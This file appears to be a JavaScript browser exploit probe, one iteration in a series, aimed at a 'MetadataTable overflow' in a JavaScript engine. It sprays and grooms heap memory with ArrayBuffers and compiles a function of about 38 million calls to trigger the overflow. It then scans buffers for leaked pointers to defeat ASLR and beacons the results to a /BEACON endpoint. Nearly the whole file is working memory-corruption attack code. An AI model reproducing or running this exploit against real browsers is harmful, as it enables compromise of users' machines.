// p150i — MetadataTable overflow: controlled spray sizes
//
// p150h crashed during spray (OOM killed process before JS catch).
// This probe tries KNOWN-SAFE spray sizes in sequence.
// Phase A: spray 5000 × 100KB (500MB), measure if it works
// Then free, compile, call.
// If 500MB isn't enough for the sweep, at least we learn the limit.
//
// Beacon prefix: V150I-

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V150I-' + tag + '&t=' + Date.now(); } catch(e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function readHex8(view, off) {
    var hex = '';
    for (var h = 7; h >= 0; h--) hex += hexByte(view[off + h]);
    return hex;
  }
  function readU32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT');

  var BUF_SZ = 100096;

  // Phase 1: Controlled spray — 5000 buffers (500MB)
  // This should be safe based on p142 handling 843MB for bytecodes
  var SPRAY_COUNT = 5000;
  var spray = [];
  var ok = true;
  try {
    for (var i = 0; i < SPRAY_COUNT; i++) {
      spray.push(new ArrayBuffer(BUF_SZ));
    }
  } catch(e) {
    ok = false;
    B('SPRAY-OOM-' + spray.length);
  }
  if (ok) B('SPRAY-OK-' + SPRAY_COUNT);

  var sprayMB = Math.round(spray.length * BUF_SZ / 1048576);
  B('VM-' + sprayMB + 'MB');

  // Phase 2: Keep 500 targets spread across the spray
  var TARGETS = 500;
  var tStride = Math.max(1, Math.floor(spray.length / TARGETS));
  var targets = [];
  var tViews = [];
  for (var i = 0; i < spray.length && targets.length < TARGETS; i += tStride) {
    targets.push(spray[i]);
    tViews.push(new Uint8Array(spray[i]));
  }
  B('TARGETS-' + targets.length);

  // Phase 3: Free everything except targets
  spray.length = 0;
  spray = null;
  B('FREED');

  // Phase 4: Aggressive GC — reclaim physical memory, keep VM mapped
  for (var g = 0; g < 15; g++) {
    var junk = [];
    for (var j = 0; j < 20000; j++) junk.push({x: j});
    junk = null;
  }
  B('GC1');

  // Phase 5: Second wave spray + free to extend VM further
  // After GC freed the first wave, we have physical memory back.
  // Spray again — new allocations go to NEW marge pages (old ones have freed slots).
  // This doubles our VM footprint.
  var wave2 = [];
  var w2ok = true;
  try {
    for (var i = 0; i < SPRAY_COUNT; i++) {
      wave2.push(new ArrayBuffer(BUF_SZ));
    }
  } catch(e) {
    w2ok = false;
    B('W2-OOM-' + wave2.length);
  }
  if (w2ok) B('W2-OK-' + SPRAY_COUNT);

  // Free wave 2 immediately
  wave2.length = 0;
  wave2 = null;
  B('W2-FREED');

  // GC again
  for (var g2 = 0; g2 < 10; g2++) {
    var j2 = [];
    for (var k = 0; k < 20000; k++) j2.push({x: k});
    j2 = null;
  }
  B('GC2');

  // Wave 3 — push VM even further
  var wave3 = [];
  var w3ok = true;
  try {
    for (var i = 0; i < SPRAY_COUNT; i++) {
      wave3.push(new ArrayBuffer(BUF_SZ));
    }
  } catch(e) {
    w3ok = false;
    B('W3-OOM-' + wave3.length);
  }
  if (w3ok) B('W3-OK-' + SPRAY_COUNT);
  wave3.length = 0;
  wave3 = null;

  for (var g3 = 0; g3 < 10; g3++) {
    var j3 = [];
    for (var k3 = 0; k3 < 20000; k3++) j3.push({x: k3});
    j3 = null;
  }
  B('GC3');

  // By now: wave1 VM (500MB) + wave2 VM (500MB) + wave3 VM (500MB) = 1.5GB of mapped VM
  // Plus whatever other mapped memory the process has (heap, stack, libs, etc)
  // Still not 4.29GB but let's see what happens

  B('TOTAL-VM-EST-1500MB');

  // Phase 6: Compile 38M function
  var N = 38348816;
  B('BUILD');

  var CHUNK = 4000000;
  var nChunks = Math.floor(N / CHUNK);
  var rem = N - nChunks * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);

  var parts = ['window.__p150fn=function(a){'];
  for (var c = 0; c < nChunks; c++) parts.push(callChunk);
  parts.push('a();'.repeat(rem));
  parts.push('};window.__p150ok=1;');
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    if (!window.__p150ok) { B('COMPILE-FAIL'); return; }
    B('COMPILED-OK');

    // Extra GC before the call
    for (var gc = 0; gc < 5; gc++) {
      var tmp = [];
      for (var t = 0; t < 10000; t++) tmp.push(t);
      tmp = null;
    }

    B('CALLING');
    try {
      window.__p150fn(function() { throw 'STOP'; });
    } catch(e) {
      B('CAUGHT-' + String(e).substring(0, 20));
    }

    B('SURVIVED');
    setTimeout(phaseScan, 100);
  };
  document.head.appendChild(sc);
  sc.src = url;

  function phaseScan() {
    B('SCAN');
    var hitBufs = 0;
    var leaks = [];

    for (var i = 0; i < tViews.length; i++) {
      var view = tViews[i];
      if (!view) continue;

      var hasData = false;
      for (var s = 0; s < view.length; s += 112) {
        if (view[s + 12] !== 0 || view[s + 24] !== 0) { hasData = true; break; }
      }
      if (!hasData) continue;
      hitBufs++;

      if (hitBufs <= 10) {
        var nz = 0;
        for (var j = 0; j < view.length; j++) if (view[j]) nz++;
        B('HIT-' + i + '-nz' + nz);

        var ptrs = 0;
        for (var off = 24; off + 8 <= view.length && ptrs < 5; off += 112) {
          if (view[off] === 0 && view[off+1] === 0 && view[off+2] === 0 && view[off+3] === 0 &&
              view[off+4] === 0 && view[off+5] === 0 && view[off+6] === 0 && view[off+7] === 0) continue;
          B('PTR-' + i + '-O' + off + '=' + readHex8(view, off));
          ptrs++;
          if (leaks.length < 10) leaks.push(readHex8(view, off));
        }

        for (var off = 12; off + 4 <= view.length; off += 112) {
          if (readU32(view, off) === 0xFFFFFFFF) {
            B('FF-' + i + '-O' + off);
            break;
          }
        }
      }
    }

    B('RESULT-h' + hitBufs + '-l' + leaks.length);
    for (var l = 0; l < leaks.length; l++) B('ASLR-' + l + '-' + leaks[l]);
    B('DONE');
  }
})();
